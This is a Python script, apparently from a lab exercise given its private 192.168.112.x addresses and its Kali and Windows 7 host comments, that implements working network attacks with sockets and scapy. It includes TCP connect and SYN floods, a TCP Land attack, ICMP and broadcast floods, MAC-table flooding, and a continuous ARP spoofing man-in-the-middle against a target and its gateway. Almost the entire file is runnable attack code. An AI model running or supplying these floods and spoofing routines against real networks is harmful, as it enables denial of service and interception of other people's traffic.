# 模拟各类泛洪攻击

import socket, random, time, os, threading

from scapy.arch import get_if_hwaddr
from scapy.layers.inet import IP, TCP, ICMP
from scapy.layers.l2 import Ether, getmacbyip, ARP
from scapy.sendrecv import send, sendp

# TCP三次握手泛洪
from scapy.volatile import RandMAC, RandIP


def socket_flood():
    while True:
        s = socket.socket()
        s.connect(('192.168.112.130', 3306))

# scapy半连接
def scapy_flood():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(dst='192.168.112.188')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)

# TCP Land
def tcp_land():
    while True:
        sport = random.randint(10000, 30000)
        pkg = IP(src='192.168.112.188', dst='192.168.112.188')/TCP(sport=sport, dport=3306, flags='S')
        send(pkg, verbose=False)

# ICMP泛洪
def icmp_flood():
    while True:
        # ip_list = ['192.168.112.188','192.168.112.189','192.168.112.187','192.168.112.186']
        # ip = random.choice(ip_list)
        payload = 'HelloWoniu'*100
        pkg = IP(src='192.168.112.148', dst='192.168.112.188')/ICMP()/payload*200  # 一次性发200个数据包
        send(pkg, verbose=False)

def icmp_broadcast():
    while True:
        payload = 'HelloWoniu'*100
        pkg = IP(dst='192.168.112.255')/ICMP()/payload*200  # 一次性发200个数据包
        send(pkg, verbose=False)

# MAC地址泛洪
def mac_flood():
    while True:
        #随机MAC
        randmac=RandMAC("*:*:*:*:*:*")
        print(randmac)
        #随机IP
        srandip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        drandip=f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        print(srandip)
        #构造数据包
        packet=Ether(src=randmac,dst=randmac)/IP(src=srandip,dst=drandip)
        # sendp(packet,iface='VMware Virtual Ethernet Adapter for VMnet8',loop=0)
        sendp(packet,iface='Realtek PCIe GbE Family Controller',loop=0)


# 攻击主机告诉被攻击主机，我是网关，告诉网关，我是被攻击主机。
def arp_spoof():
    iface = "VMware Virtual Ethernet Adapter for VMnet8"
    # 被攻击主机的MAC和IP， Windows7
    target_ip = '192.168.112.130'
    target_mac = '00:0c:29:fd:b9:7e'

    # 攻击主机的MAC和IP， Kali
    spoof_ip = '192.168.112.148'
    spoof_mac = '00:0c:29:5e:0a:00'

    # 真实网关的MAC和IP
    gateway_ip = '192.168.112.2'
    geteway_mac = getmacbyip(gateway_ip)

    # 构造两个数据包，实现对被攻击主机和网关的欺骗
    while True:
        # 欺骗被攻击主机：op=1: ARP请求， op=2：ARP响应
        packet = Ether(src=spoof_mac, dst=target_mac)/ARP(hwsrc=spoof_mac, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2)
        sendp(packet, iface=iface)

        # 欺骗网关
        packet = Ether(src=spoof_mac, dst=geteway_mac)/ARP(hwsrc=spoof_mac, psrc=target_ip, hwdst=geteway_mac, pdst=gateway_ip, op=2)
        sendp(packet, iface=iface)

        time.sleep(1)


if __name__ == '__main__':
    # for i in range(5):
        # threading.Thread(target=socket_flood).start()
        # threading.Thread(target=scapy_flood).start()
        # threading.Thread(target=tcp_land).start()
        # threading.Thread(target=icmp_flood).start()
        # threading.Thread(target=icmp_broadcast).start()
        # threading.Thread(target=mac_flood).start()

    arp_spoof()